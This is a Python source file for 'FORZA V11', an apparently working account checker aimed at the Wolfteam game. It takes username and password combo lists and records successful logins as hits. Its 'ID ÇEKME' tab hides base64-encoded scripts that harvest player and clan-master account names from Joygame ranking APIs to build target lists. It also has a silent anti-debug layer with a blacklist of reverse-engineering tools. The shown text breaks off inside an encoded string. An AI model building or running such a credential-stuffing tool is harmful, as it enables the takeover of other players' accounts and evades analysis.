import sys
import os
import json
import threading
import queue
import time
from datetime import datetime
import customtkinter as ctk
import tkinter as tk
from tkinter import filedialog, messagebox

import license_manager

# ═══════════════════════════════════════════════════════════════════════════
# KORUMA KATMANI — Kopyalama, yeniden adlandırma ve modifiye tespiti
# ═══════════════════════════════════════════════════════════════════════════
def _integrity_check():
    """Sessizce çıkar — hiçbir hata mesajı vermez (cracker'ı yanıltır)."""
    try:
        import hashlib
        import ctypes
        
        # 1. EXE İSİM DOĞRULAMA
        if getattr(sys, 'frozen', False):
            exe_name = os.path.basename(sys.executable).lower()
            _VALID_NAMES = {"forza_wolfteam.exe"}
            if exe_name not in _VALID_NAMES:
                return False
        
        # 2. KRİTİK DOSYA DOĞRULAMA
        if getattr(sys, 'frozen', False):
            try:
                import importlib
                spec = importlib.util.find_spec('license_manager')
                if spec is None:
                    return False
            except Exception:
                return False
        
        # 3. ANTİ-DEBUG
        try:
            if ctypes.windll.kernel32.IsDebuggerPresent():
                return False
        except Exception:
            pass
        
        # 4. ANTİ-RE ARAÇLARI
        try:
            import psutil
            _BLACKLIST = {
                "x64dbg.exe", "x32dbg.exe", "ollydbg.exe",
                "ida.exe", "ida64.exe", "idag.exe", "idag64.exe",
                "ghidra.exe", "ghidrarun.exe",
                "processhacker.exe", "procmon.exe", "procmon64.exe",
                "procexp.exe", "procexp64.exe",
                "wireshark.exe", "fiddler.exe",
                "dnspy.exe", "de4dot.exe", "ilspy.exe",
                "httpdebugger.exe", "cheatengine.exe",
                "py.exe", "python.exe", "pythonw.exe",
            }
            for p in psutil.process_iter(['name']):
                try:
                    if p.info['name'] and p.info['name'].lower() in _BLACKLIST:
                        return False
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    pass
        except Exception:
            pass
        
        # 5. ZAMANLAMA ANTİ-DEBUG
        try:
            import time
            t1 = time.perf_counter_ns()
            _x = sum(range(10000))
            t2 = time.perf_counter_ns()
            if (t2 - t1) > 50_000_000:
                return False
        except Exception:
            pass
        
        # 6. EXE BOYUT KONTROLÜ
        if getattr(sys, 'frozen', False):
            try:
                fsize = os.path.getsize(sys.executable)
                if fsize < 15_000_000 or fsize > 25_000_000:
                    return False
            except Exception:
                pass
            
    except Exception:
        return False
    
    return True

if not _integrity_check():
    sys.exit(0)

# ═══════════════════════════════════════════════════════════════════════════
# OTOMATİK MODÜL KURULUM — Eksik paketleri pip ile yükler
# ═══════════════════════════════════════════════════════════════════════════
def _auto_install_modules():
    """Gerekli modüller eksikse CMD ekranı açıp pip ile yükler."""
    REQUIRED = ["requests", "urllib3", "certifi", "charset_normalizer", "idna"]
    missing = []
    for mod in REQUIRED:
        try:
            __import__(mod)
        except ImportError:
            missing.append(mod)

    if not missing:
        return  # Hepsi yüklü, devam et

    import subprocess, sys
    pkg_str = " ".join(missing)
    print(f"Eksik modüller tespit edildi: {pkg_str}")

    if getattr(sys, "frozen", False):
        # Frozen exe: python.exe'yi bul
        python_cmd = "python"
    else:
        python_cmd = sys.executable

    # CMD ekranı aç, pip ile yükle, bitince kapat
    cmd = f'pip install {pkg_str}'
    try:
        proc = subprocess.Popen(
            f'start /wait cmd /k "{cmd} && echo. && echo Kurulum tamamlandi, pencere kapanacak... && timeout /t 3 && exit"',
            shell=True
        )
        proc.wait()
    except Exception as e:
        print(f"Otomatik kurulum başarısız: {e}")

_auto_install_modules()


# ─── BASE PATH ─────────────────────────────────────────────────────────────
BASE_DIR = os.path.dirname(os.path.abspath(
    sys.executable if getattr(sys, 'frozen', False) else __file__
))
STATE_FILE = os.path.join(BASE_DIR, "resume_state.json")

# ═══════════════════════════════════════════════════════════════════════════
# RENK PALETİ — Neon Cyber
# ═══════════════════════════════════════════════════════════════════════════
class C:
    BG        = "#06060a"      # Ultra koyu arka plan
    SIDEBAR   = "#0c0c14"      # Sidebar arka plan
    CARD      = "#10101a"      # Kart arka plan
    CARD_H    = "#181828"      # Kart hover
    INPUT     = "#0a0a12"      # Giriş alanı
    BORDER    = "#1a1a2e"      # Kenarlık
    BORDER_L  = "#2a2a44"      # Açık kenarlık
    ACCENT    = "#7c3aed"      # Mor vurgu (ana renk)
    ACCENT_H  = "#8b5cf6"      # Mor hover
    ACCENT_DIM= "#4c1d95"      # Koyu mor
    OK        = "#00ff88"      # Neon yeşil (HIT)
    OK_H      = "#33ffaa"      # Yeşil hover
    OK_DIM    = "#00cc6a"      # Koyu yeşil
    FAIL      = "#ff3366"      # Neon pembe-kırmızı
    FAIL_H    = "#ff5580"      # Fail hover
    WARN      = "#ffaa00"      # Amber uyarı
    WARN_H    = "#ffcc44"      # Amber hover
    CYAN      = "#00d4ff"      # Neon cyan (hız)
    WHITE     = "#e8e8f0"      # Beyazımsı
    GRAY      = "#8888aa"      # Gri metin
    MUTED     = "#555577"      # Soluk metin
    STOP      = "#cc2244"      # Durdur
    STOP_H    = "#ff3355"      # Durdur hover

FN = "Segoe UI"
FM = "Consolas"

# ═══════════════════════════════════════════════════════════════════════════
# ANA UYGULAMA
# ═══════════════════════════════════════════════════════════════════════════
class ForzaApp(ctk.CTk):
    def __init__(self):
        super().__init__()

        self.title("FORZA V11 — WOLFTEAM CHECKER")
        self.geometry("1050x700")
        self.minsize(950, 620)
        self.configure(fg_color=C.BG)
        self.attributes("-topmost", True)
        ctk.set_appearance_mode("dark")

        # Variables
        self.combo_mode    = tk.StringVar(value="multi")
        self.accounts_path = tk.StringVar()
        self.usernames_path= tk.StringVar()
        self.passwords_path= tk.StringVar()
        self.is_running    = False
        self.stop_event    = threading.Event()
        self.msg_queue     = queue.Queue()
        self.n_ok          = 0
        self.n_fail        = 0
        self.n_total       = 0
        self.last_index    = 0
        self._last_activity  = 0
        self._watchdog_fails = 0
        self._start_time     = 0
        self.hit_list        = []
        self.hit_widgets     = []
        self._launcher = None

        self._load_state()
        self._build_ui()
        self._show_splash_overlay()

    # ══════════════════════════════════════════════════
    # SPLASH — Neon Cyber Animasyonu
    # ══════════════════════════════════════════════════
    def _show_splash_overlay(self):
        self._splash = ctk.CTkFrame(self, fg_color=C.BG)
        self._splash.place(relx=0, rely=0, relwidth=1, relheight=1)
        
        center = ctk.CTkFrame(self._splash, fg_color="transparent")
        center.place(relx=0.5, rely=0.42, anchor="center")
        
        # Logo kutusu — neon çerçeveli
        logo_box = ctk.CTkFrame(center, fg_color=C.CARD, corner_radius=20, 
                                border_width=2, border_color=C.ACCENT, width=320, height=180)
        logo_box.pack()
        logo_box.pack_propagate(False)
        
        logo_inner = ctk.CTkFrame(logo_box, fg_color="transparent")
        logo_inner.place(relx=0.5, rely=0.45, anchor="center")
        
        ctk.CTkLabel(logo_inner, text="⚡", font=ctk.CTkFont(size=48)).pack()
        
        name_row = ctk.CTkFrame(logo_inner, fg_color="transparent")
        name_row.pack(pady=(5, 0))
        ctk.CTkLabel(name_row, text="FORZA", font=ctk.CTkFont(FN, 36, "bold"), 
                     text_color=C.ACCENT).pack(side="left")
        ctk.CTkLabel(name_row, text=" V11", font=ctk.CTkFont(FN, 26, "bold"), 
                     text_color=C.OK).pack(side="left")
        
        ctk.CTkLabel(center, text="W O L F T E A M   C H E C K E R", 
                     font=ctk.CTkFont(FN, 10, "bold"), text_color=C.MUTED).pack(pady=(12, 15))
        
        self._sp_bar = ctk.CTkProgressBar(center, fg_color=C.BORDER, 
                                           progress_color=C.ACCENT, width=280, height=3)
        self._sp_bar.pack()
        self._sp_bar.set(0)
        
        ctk.CTkLabel(center, text="Sistem hazırlanıyor...", 
                     font=ctk.CTkFont(FN, 9), text_color=C.MUTED).pack(pady=(8, 0))

        def _anim(step=0):
            if step <= 15:
                self._sp_bar.set(step / 15)
                if step == 1:
                    self._import_launcher()
                self.after(100, _anim, step + 1)
            else:
                self._splash.destroy()
                self._poll()
                threading.Thread(target=self._watchdog, daemon=True).start()
                self.protocol("WM_DELETE_WINDOW", self._on_close)
                self._setup_rdp_monitor()

        self.after(50, _anim)

    # ══════════════════════════════════════════════════
    # ANA ARAYÜZ — 3 Panel (Sidebar + Merkez + Hit)
    # ══════════════════════════════════════════════════
    def _build_ui(self):
        # ── ÜSTTE SEKME MENÜSÜ ──
        tab_bar = ctk.CTkFrame(self, fg_color=C.SIDEBAR, corner_radius=0, height=42)
        tab_bar.pack(fill="x", side="top")
        tab_bar.pack_propagate(False)

        self._tab_checker_btn = ctk.CTkButton(
            tab_bar, text="⚡  CHECKER", fg_color=C.ACCENT, hover_color=C.ACCENT_H,
            font=ctk.CTkFont(FN, 12, "bold"), corner_radius=0, height=42, width=160,
            text_color="white", command=lambda: self._switch_tab("checker")
        )
        self._tab_checker_btn.pack(side="left")

        self._tab_idcekme_btn = ctk.CTkButton(
            tab_bar, text="🔍  İD ÇEKME", fg_color=C.CARD, hover_color=C.CARD_H,
            font=ctk.CTkFont(FN, 12, "bold"), corner_radius=0, height=42, width=160,
            text_color=C.GRAY, command=lambda: self._switch_tab("idcekme")
        )
        self._tab_idcekme_btn.pack(side="left")

        # ── İÇERİK KONTEYNER ──
        self._content_frame = ctk.CTkFrame(self, fg_color="transparent")
        self._content_frame.pack(fill="both", expand=True)

        # Her sekmenin çerçevesi
        self._checker_frame = ctk.CTkFrame(self._content_frame, fg_color="transparent")
        self._idcekme_frame = ctk.CTkFrame(self._content_frame, fg_color="transparent")

        self._build_checker_panel(self._checker_frame)
        self._build_idcekme_panel(self._idcekme_frame)

        self._current_tab = None
        self._switch_tab("checker")

    def _switch_tab(self, tab_name):
        if self._current_tab == tab_name:
            return
        self._current_tab = tab_name

        # Sekmeler gizle
        self._checker_frame.pack_forget()
        self._idcekme_frame.pack_forget()

        if tab_name == "checker":
            self._checker_frame.pack(fill="both", expand=True)
            self._tab_checker_btn.configure(fg_color=C.ACCENT, text_color="white")
            self._tab_idcekme_btn.configure(fg_color=C.CARD, text_color=C.GRAY)
        else:
            self._idcekme_frame.pack(fill="both", expand=True)
            self._tab_idcekme_btn.configure(fg_color=C.ACCENT, text_color="white")
            self._tab_checker_btn.configure(fg_color=C.CARD, text_color=C.GRAY)

    # ══════════════════════════════════════════════════
    # İD ÇEKME PANELİ
    # ══════════════════════════════════════════════════
    def _build_idcekme_panel(self, parent):
        import base64 as _b64, threading, queue as _queue, io

        _RUTBELI_B64 = "aW1wb3J0IHJlcXVlc3RzCmltcG9ydCB0aW1lCgpwcmludCgiIiIKRk9SWkEKIiIiKQoKQkFTRV9VUkwgPSAiaHR0cDovL3dvbGZ0ZWFta2xhbi5qb3lnYW1lLmNvbS9SYW5raW5nL0dldFJhbmtpbmciCkRBVEFfRklMRSA9ICJSw5xUQkVMxLAudHh0IgoKCmRlZiBmZXRjaF9wbGF5ZXJzX3VudGlsX2VtcHR5KHN0YXJ0X2luZGV4LCBsaW1pdCwgcmFua190eXBlPTEsIG9yZGVyX3R5cGU9MSk6CiAgICBjb3VudCA9IDAKCiAgICB0cnk6CiAgICAgICAgd2hpbGUgVHJ1ZToKICAgICAgICAgICAgcGFyYW1zID0gewogICAgICAgICAgICAgICAgIlJhbmtUeXBlIjogcmFua190eXBlLAogICAgICAgICAgICAgICAgIk9yZGVyVHlwZSI6IG9yZGVyX3R5cGUsCiAgICAgICAgICAgICAgICAiU3RhcnRJbmRleCI6IHN0YXJ0X2luZGV4CiAgICAgICAgICAgIH0KCiAgICAgICAgICAgIHJlc3BvbnNlID0gcmVxdWVzdHMuZ2V0KEJBU0VfVVJMLCBwYXJhbXM9cGFyYW1zKQogICAgICAgICAgICByZXNwb25zZS5yYWlzZV9mb3Jfc3RhdHVzKCkKCiAgICAgICAgICAgIGRhdGEgPSByZXNwb25zZS5qc29uKCkKICAgICAgICAgICAgdXNlcnMgPSBkYXRhLmdldCgiRGF0YSIsIFtdKQoKICAgICAgICAgICAgaWYgbm90IHVzZXJzOgogICAgICAgICAgICAgICAgcHJpbnQoIlZlcmkgYml0dGkuIikKICAgICAgICAgICAgICAgIGJyZWFrCgogICAgICAgICAgICBmb3IgdXNlciBpbiB1c2VyczoKCiAgICAgICAgICAgICAgICBpZiBjb3VudCA+PSBsaW1pdDoKICAgICAgICAgICAgICAgICAgICBwcmludChmIlxuVG9wbGFtIHtsaW1pdH0gSUQgw6dla2lsZGkuIikKICAgICAgICAgICAgICAgICAgICByZXR1cm4KCiAgICAgICAgICAgICAgICBhY2NvdW50ID0gdXNlci5nZXQoIkFjY291bnQiLCAiTi9BIikKCiAgICAgICAgICAgICAgICBjb3VudCArPSAxCgogICAgICAgICAgICAgICAgcHJpbnQoZiJ7Y291bnR9LiB7YWNjb3VudH0iKQoKICAgICAgICAgICAgICAgIHdpdGggb3BlbihEQVRBX0ZJTEUsICJhIiwgZW5jb2Rpbmc9InV0Zi04IikgYXMgZmlsZToKICAgICAgICAgICAgICAgICAgICBmaWxlLndyaXRlKGYie2FjY291bnR9XG4iKQoKICAgICAgICAgICAgICAgIHRpbWUuc2xlZXAoMCkKCiAgICAgICAgICAgIHN0YXJ0X2luZGV4ICs9IDEKCiAgICBleGNlcHQgcmVxdWVzdHMuZXhjZXB0aW9ucy5SZXF1ZXN0RXhjZXB0aW9uIGFzIGU6CiAgICAgICAgcHJpbnQoZiJBUEkgaXN0ZcSfaSBiYcWfYXLEsXPEsXo6IHtlfSIpCgoKZGVmIG1haW4oKToKICAgIHN0YXJ0X2luZGV4ID0gaW50KGlucHV0KCJCYcWfbGFuZ8Sxw6cgaW5kZXhpbmkgZ2lyaW46ICIpKQogICAgbGltaXQgPSBpbnQoaW5wdXQoIkthw6cgYWRldCBJRCDDp2VraWxzaW4/OiAiKSkKCiAgICBmZXRjaF9wbGF5ZXJzX3VudGlsX2VtcHR5KHN0YXJ0X2luZGV4LCBsaW1pdCkKCgppZiBfX25hbWVfXyA9PSAiX19tYWluX18iOgogICAgbWFpbigp"
        _ISIMMASTER_B64 = "aW1wb3J0IHJlcXVlc3RzDQoNCnByaW50KCIiIg0K4paI4paI4paI4paI4paI4paI4paI4pWXIOKWiOKWiOKWiOKWiOKWiOKWiOKVlyDilojilojilojilojilojilojilZcg4paI4paI4paI4paI4paI4paI4paI4pWXIOKWiOKWiOKWiOKWiOKWiOKVlyANCuKWiOKWiOKVlOKVkOKVkOKVkOKVkOKVneKWiOKWiOKVlOKVkOKVkOKVkOKWiOKWiOKVl+KWiOKWiOKVlOKVkOKVkOKWiOKWiOKVl+KVmuKVkOKVkOKWiOKWiOKWiOKVlOKVneKWiOKWiOKVlOKVkOKVkOKWiOKWiOKVlw0K4paI4paI4paI4paI4paI4pWXICDilojilojilZEgICDilojilojilZHilojilojilojilojilojilojilZTilZ0gIOKWiOKWiOKWiOKVlOKVnSDilojilojilojilojilojilojilojilZENCuKWiOKWiOKVlOKVkOKVkOKVnSAg4paI4paI4pWRICAg4paI4paI4pWR4paI4paI4pWU4pWQ4pWQ4paI4paI4pWXIOKWiOKWiOKWiOKVlOKVnSAg4paI4paI4pWU4pWQ4pWQ4paI4paI4pWRDQrilojilojilZEgICAgIOKVmuKWiOKWiOKWiOKWiOKWiOKWiOKVlOKVneKWiOKWiOKVkSAg4paI4paI4pWR4paI4paI4paI4paI4paI4paI4paI4pWX4paI4paI4pWRICDilojilojilZENCuKVmuKVkOKVnSAgICAgIOKVmuKVkOKVkOKVkOKVkOKVkOKVnSDilZrilZDilZ0gIOKVmuKVkOKVneKVmuKVkOKVkOKVkOKVkOKVkOKVkOKVneKVmuKVkOKVnSAg4pWa4pWQ4pWdDQoNCiAgICAgICAgICAgICAgICAgICAgICBGIE8gUiBaIEENCiIiIikNCg0KZGVmIGNsYW5tYXN0ZXJfYmlsZ2lzaV9nZXRpcihjbGFuX25hbWUpOg0KICAgIHVybCA9IGYiaHR0cDovL3dvbGZ0ZWFta2xhbi5qb3lnYW1lLmNvbS9DbGFuL0dldENsYW5Qcm9maWVJbmZvP2NsYW5OYW1lPXtjbGFuX25hbWV9Ig0KICAgIHRyeToNCiAgICAgICAgcmVzcG9uc2UgPSByZXF1ZXN0cy5nZXQodXJsKQ0KICAgICAgICByZXNwb25zZS5yYWlzZV9mb3Jfc3RhdHVzKCkNCiAgICAgICAgZGF0YSA9IHJlc3BvbnNlLmpzb24oKQ0KICAgICAgICBjbGFubWFzdGVyID0gZGF0YS5nZXQoJ0RhdGEnLCB7fSkuZ2V0KCdDbGFuTWFzdGVyJykNCiAgICAgICAgaWYgY2xhbm1hc3RlcjoNCiAgICAgICAgICAgIHJldHVybiBjbGFubWFzdGVyICAjIGxvd2VyKCkga2FsZMSxcsSxbGTEsQ0KICAgICAgICByZXR1cm4gTm9uZQ0KICAgIGV4Y2VwdCBFeGNlcHRpb246DQogICAgICAgIHJldHVybiBOb25lDQoNCmRlZiBrdWxsYW5pY2lfYmlsZ2lzaV9nZXRpcihuaWNrbmFtZSk6DQogICAgdXJsID0gZiJodHRwOi8vd29sZnRlYW1rbGFuLmpveWdhbWUuY29tL2NoYXJhY3Rlci9HZXRVc2Vyc0dhbWVJbmZvV2l0aG91dEZiQ29ubmVjdD9yYW5rdHlwZT0xJm5pY2tuYW1lPXtuaWNrbmFtZX0iDQogICAgdHJ5Og0KICAgICAgICByZXNwb25zZSA9IHJlcXVlc3RzLmdldCh1cmwpDQogICAgICAgIHJlc3BvbnNlLnJhaXNlX2Zvcl9zdGF0dXMoKQ0KICAgICAgICBkYXRhID0gcmVzcG9uc2UuanNvbigpDQogICAgICAgIGFjY291bnQgPSBkYXRhLmdldCgnRGF0YScsIHt9KS5nZXQoJ0FjY291bnQnKQ0KICAgICAgICBjbGFuX25hbWUgPSBkYXRhLmdldCgnRGF0YScsIHt9KS5nZXQoJ0NsYW5OYW1lJykNCg0KICAgICAgICB3aXRoIG9wZW4oImFjY291bnRfbGlzdC50eHQiLCAiYSIsIGVuY29kaW5nPSJ1dGYtOCIpIGFzIGRvc3lhOg0KICAgICAgICAgICAgaWYgYWNjb3VudDoNCiAgICAgICAgICAgICAgICBwcmludChhY2NvdW50KQ0KICAgICAgICAgICAgICAgIGRvc3lhLndyaXRlKGFjY291bnQgKyAiXG4iKSAgIyBsb3dlcigpIGthbGTEsXLEsWxkxLENCg0KICAgICAgICAgICAgICAgIGlmIGNsYW5fbmFtZToNCiAgICAgICAgICAgICAgICAgICAgY2xhbm1hc3RlciA9IGNsYW5tYXN0ZXJfYmlsZ2lzaV9nZXRpcihjbGFuX25hbWUpDQogICAgICAgICAgICAgICAgICAgIGlmIGNsYW5tYXN0ZXI6DQogICAgICAgICAgICAgICAgICAgICAgICBwcmludChjbGFubWFzdGVyKQ0KICAgICAgICAgICAgICAgICAgICAgICAgZG9zeWEud3JpdGUoY2xhbm1hc3RlciArICJcbiIpICAjIGxvd2VyKCkga2FsZMSxcsSxbGTEsQ0KICAgICAgICAgICAgZWxzZToNCiAgICAgICAgICAgICAgICBwcmludCgiQWNjb3VudCBiaWxnaXNpIGJ1bHVuYW1hZMSxLiIpDQogICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOg0KICAgICAgICBwcmludCgiQVBJIGlzdGXEn2kgYmHFn2FyxLFzxLF6IG9sZHU6IiwgZSkNCg0KZGVmIG1haW4oKToNCiAgICBwcmludCgiRW5nZWxsZWRpxJ9pbiBracWfaWxlcmluIEFjY291bnQgdmUgQ2xhbk1hc3RlciBiaWxnaWxlcmluaSBvcmlqaW5hbCBoYWxpeWxlIGFsdCBhbHRhIGtheWRldCIpDQogICAgcHJpbnQoIsOHxLFrbWFrIGnDp2luICdleGl0JyB5YXouIikNCiAgICB3aGlsZSBUcnVlOg0KICAgICAgICBuaWNrbmFtZSA9IGlucHV0KCJOaWNrbmFtZSBnaXI6ICIpDQogICAgICAgIGlmIG5pY2tuYW1lLmxvd2VyKCkgPT0gImV4aXQiOg0KICAgICAgICAgICAgcHJpbnQoIlByb2dyYW0ga2FwYXTEsWzEsXlvci4uLiIpDQogICAgICAgICAgICBicmVhaw0KICAgICAgICBrdWxsYW5pY2lfYmlsZ2lzaV9nZXRpcihuaWNrbmFtZSkNCg0KaWYgX19uYW1lX18gPT0gIl9fbWFpbl9fIjoNCiAgICBtYWluKCkNCg=="
        _CLANMASTER_B64 = "aW1wb3J0IHJlcXVlc3RzDQoNCnByaW50KCIiIg0K4paI4paI4paI4paI4paI4paI4paI4pWXIOKWiOKWiOKWiOKWiOKWiOKWiOKVlyDilojilojilojilojilojilojilZcg4paI4paI4paI4paI4paI4paI4paI4pWXIOKWiOKWiOKWiOKWiOKWiOKVlyANCuKWiOKWiOKVlOKVkOKVkOKVkOKVkOKVneKWiOKWiOKVlOKVkOKVkOKVkOKWiOKWiOKVl+KWiOKWiOKVlOKVkOKVkOKWiOKWiOKVl+KVmuKVkOKVkOKWiOKWiOKWiOKVlOKVneKWiOKWiOKVlOKVkOKVkOKWiOKWiOKVlw0K4paI4paI4paI4paI4paI4pWXICDilojilojilZEgICDilojilojilZHilojilojilojilojilojilojilZTilZ0gIOKWiOKWiOKWiOKVlOKVnSDilojilojilojilojilojilojilojilZENCuKWiOKWiOKVlOKVkOKVkOKVnSAg4paI4paI4pWRICAg4paI4paI4pWR4paI4paI4pWU4pWQ4pWQ4paI4paI4pWXIOKWiOKWiOKWiOKVlOKVnSAg4paI4paI4pWU4pWQ4pWQ4paI4paI4pWRDQrilojilojilZEgICAgIOKVmuKWiOKWiOKWiOKWiOKWiOKWiOKVlOKVneKWiOKWiOKVkSAg4paI4paI4pWR4paI4paI4paI4paI4paI4paI4paI4pWX4paI4paI4pWRICDilojilojilZENCuKVmuKVkOKVnSAgICAgIOKVmuKVkOKVkOKVkOKVkOKVkOKVnSDilZrilZDilZ0gIOKVmuKVkOKVneKVmuKVkOKVkOKVkOKVkOKVkOKVkOKVneKVmuKVkOKVnSAg4pWa4pWQ4pWdDQoNCiAgICAgIEYgTyBSIFogQSBMIFMgQSBUDQogICAgICAgICAgICAgICAgICAgICAgDQoiIiIpDQoNCmRlZiBrdWxsYW5pY2lfYmlsZ2lzaV9nZXRpcihuaWNrbmFtZSk6DQogICAgdXJsID0gZiJodHRwOi8vd29sZnRlYW1rbGFuLmpveWdhbWUuY29tL0NsYW4vR2V0Q2xhblByb2ZpZUluZm8/Y2xhbk5hbWU9e25pY2tuYW1lfSINCiAgICB0cnk6DQogICAgICAgIHJlc3BvbnNlID0gcmVxdWVzdHMuZ2V0KHVybCkNCiAgICAgICAgcmVzcG9uc2UucmFpc2VfZm9yX3N0YXR1cygpDQogICAgICAgIGRhdGEgPSByZXNwb25zZS5qc29uKCkNCiAgICAgICAgY2xhbm1hc3RlciA9IGRhdGEuZ2V0KCdEYXRhJywge30pLmdldCgnQ2xhbk1hc3RlcicpDQoNCiAgICAgICAgaWYgY2xhbm1hc3RlcjoNCiAgICAgICAgICAgIHByaW50KGNsYW5tYXN0ZXIpDQogICAgICAgICAgICB3aXRoIG9wZW4oImNsYW5tYXN0ZXJfbGlzdC50eHQiLCAiYSIsIGVuY29kaW5nPSJ1dGYtOCIpIGFzIGRvc3lhOg0KICAgICAgICAgICAgICAgIGRvc3lhLndyaXRlKGNsYW5tYXN0ZXIgKyAiXG4iKQ0KICAgICAgICBlbHNlOg0KICAgICAgICAgICAgcHJpbnQoIkNsYW5NYXN0ZXIgYmlsZ2lzaSBidWx1bmFtYWTEsS4iKQ0KDQogICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOg0KICAgICAgICBwcmludCgiQVBJIGlzdGXEn2kgYmHFn2FyxLFzxLF6IG9sZHU6IiwgZSkNCg0KZGVmIG1haW4oKToNCiAgICBwcmludCgiRW5nZWxsZWRpxJ9pbiBracWfaWxlcmluIENsYW5NYXN0ZXIgYmlsZ2lsZXJpbmkgw6dlayB2ZSAnY2xhbm1hc3Rlcl9saXN0LnR4dCcgZG9zeWFzxLFuYSBrYXlkZXQiKQ0KICAgIHByaW50KCLDh8Sxa21hayBpw6dpbiAnZXhpdCcgeWF6LiIpDQogICAgd2hpbGUgVHJ1ZToNCiAgICAgICAgbmlja25hbWUgPSBpbnB1dCgiTmlja25hbWUgZ2lyOiAiKQ0KICAgICAgICBpZiBuaWNrbmFtZS5sb3dlcigpID09ICJleGl0IjoNCiAgICAgICAgICAgIHByaW50KCJQcm9ncmFtIGthcGF0xLFsxLF5b3IuLi4iKQ0KICAgICAgICAgICAgYnJlYWsNCiAgICAgICAga3VsbGFuaWNpX2JpbGdpc2lfZ2V0aXIobmlja25hbWUpDQoNCmlmIF9fbmFtZV9fID09ICJfX21haW5fXyI6DQogICAgbWFpbigpDQo="
        _KLAN_B64 = "aW1wb3J0IHJlcXVlc3RzDQppbXBvcnQgdGltZQ0KaW1wb3J0IG9zDQojIC0tLSBDTUQgRUtSQU5JTkEgWUFaSSAtLS0NCnByaW50KCIiIg0KRk9SWkEgS0xBTiDDh0VLTUUNCiIiIikNCmltcG9ydCByZXF1ZXN0cw0KaW1wb3J0IHRpbWUNCmltcG9ydCBvcw0KDQojIEFQSSBVUkwnc2kNCkJBU0VfVVJMID0gImh0dHA6Ly93b2xmdGVhbWtsYW4uam95Z2FtZS5jb20vQ2xhbi9HZXRDbGFuUmFua2luZ0J5VHlwZT9SYW5raW5nVHlwZT0zIg0KREFUQV9GSUxFID0gInllbmlLTEFOLnR4dCIgICMgVmVyaWxlcmluIGtheWRlZGlsZWNlxJ9pIGRvc3lhDQoNCiMgVFhUIGRvc3lhc8SxbmRhbiBlbiBzb24ga2HDpyBzYXTEsXIgeWF6xLFsZMSxxJ/EsW7EsSBhbCAoa2FsZMSxxJ/EsW4geWVyaSBidWxtYWsgacOnaW4pDQpkZWYgZ2V0X2xhc3RfaW5kZXgoKToNCiAgICBpZiBub3Qgb3MucGF0aC5leGlzdHMoREFUQV9GSUxFKToNCiAgICAgICAgcmV0dXJuIDANCiAgICB3aXRoIG9wZW4oREFUQV9GSUxFLCAiciIsIGVuY29kaW5nPSJ1dGYtOCIpIGFzIGZpbGU6DQogICAgICAgIHJldHVybiBsZW4oZmlsZS5yZWFkbGluZXMoKSkNCg0KIyBLbGFuIGJpbGdpbGVyaW5pIMOnZWtlbiBmb25rc2l5b24NCmRlZiBmZXRjaF9jbGFuX2RhdGEoc3RhcnRfaW5kZXgsIG1heF9jbGFucz01MDAwMDApOg0KICAgIGNsYW5fZGF0YSA9IFtdDQoNCiAgICB0cnk6DQogICAgICAgIHdoaWxlIGxlbihjbGFuX2RhdGEpIDwgbWF4X2NsYW5zOg0KICAgICAgICAgICAgcGFyYW1zID0gew0KICAgICAgICAgICAgICAgICJSYW5raW5nVHlwZSI6IDEsDQogICAgICAgICAgICAgICAgIlN0YXJ0SW5kZXgiOiBzdGFydF9pbmRleCwNCiAgICAgICAgICAgICAgICAiT3JkZXJUeXBlIjogMQ0KICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICByZXNwb25zZSA9IHJlcXVlc3RzLmdldChCQVNFX1VSTCwgcGFyYW1zPXBhcmFtcykNCiAgICAgICAgICAgIHJlc3BvbnNlLnJhaXNlX2Zvcl9zdGF0dXMoKQ0KDQogICAgICAgICAgICB0cnk6DQogICAgICAgICAgICAgICAgZGF0YSA9IHJlc3BvbnNlLmpzb24oKQ0KICAgICAgICAgICAgZXhjZXB0IFZhbHVlRXJyb3I6DQogICAgICAgICAgICAgICAgcHJpbnQoIkhhdGE6IEdlw6dlcnNpeiBKU09OIHlhbsSxdMSxIGFsxLFuZMSxLiIpDQogICAgICAgICAgICAgICAgYnJlYWsNCg0KICAgICAgICAgICAgY2xhbnMgPSBkYXRhLmdldCgiRGF0YSIsIFtdKQ0KDQogICAgICAgICAgICBpZiBub3QgY2xhbnM6DQogICAgICAgICAgICAgICAgcHJpbnQoIlZlcmkgYnVsdW5hbWFkxLEsIGnFn2xlbSB0YW1hbWxhbmTEsS4iKQ0KICAgICAgICAgICAgICAgIGJyZWFrDQoNCiAgICAgICAgICAgIGZvciBjbGFuIGluIGNsYW5zOg0KICAgICAgICAgICAgICAgIGNsYW5fbWFzdGVyID0gY2xhbi5nZXQoIkNsYW5NYXN0ZXIiLCAiIikuc3RyaXAoKQ0KDQogICAgICAgICAgICAgICAgaWYgY2xhbl9tYXN0ZXI6DQogICAgICAgICAgICAgICAgICAgIGNsYW5fZGF0YS5hcHBlbmQoY2xhbl9tYXN0ZXIpDQogICAgICAgICAgICAgICAgICAgIHByaW50KGNsYW5fbWFzdGVyKQ0KDQogICAgICAgICAgICAgICAgICAgICMgT3JpamluYWwgaGFsaXlsZSBkb3N5YXlhIHlhesSxbMSxeW9yIChrw7zDp8O8ayBoYXJmZSDDp2V2cmlsbWl5b3IpDQogICAgICAgICAgICAgICAgICAgIHdpdGggb3BlbihEQVRBX0ZJTEUsICJhIiwgZW5jb2Rpbmc9InV0Zi04IikgYXMgZmlsZToNCiAgICAgICAgICAgICAgICAgICAgICAgIGZpbGUud3JpdGUoY2xhbl9tYXN0ZXIgKyAiXG4iKQ0KICAgICAgICAgICAgICAgICAgICAgICAgZmlsZS5mbHVzaCgpDQoNCiAgICAgICAgICAgICAgICAgICAgdGltZS5zbGVlcCgwKQ0KDQogICAgICAgICAgICAgICAgaWYgbGVuKGNsYW5fZGF0YSkgPj0gbWF4X2NsYW5zOg0KICAgICAgICAgICAgICAgICAgICBicmVhaw0KDQogICAgICAgICAgICBzdGFydF9pbmRleCArPSAxDQoNCiAgICBleGNlcHQgcmVxdWVzdHMuZXhjZXB0aW9ucy5SZXF1ZXN0RXhjZXB0aW9uIGFzIGU6DQogICAgICAgIHByaW50KGYiQVBJIGlzdGXEn2kgYmHFn2FyxLFzxLF6OiB7ZX0iKQ0KDQogICAgcmV0dXJuIGNsYW5fZGF0YQ0KDQojIEFuYSBmb25rc2l5b24NCmRlZiBtYWluKCk6DQogICAgbGFzdF9pbmRleCA9IGdldF9sYXN0X2luZGV4KCkNCiAgDQogICAgY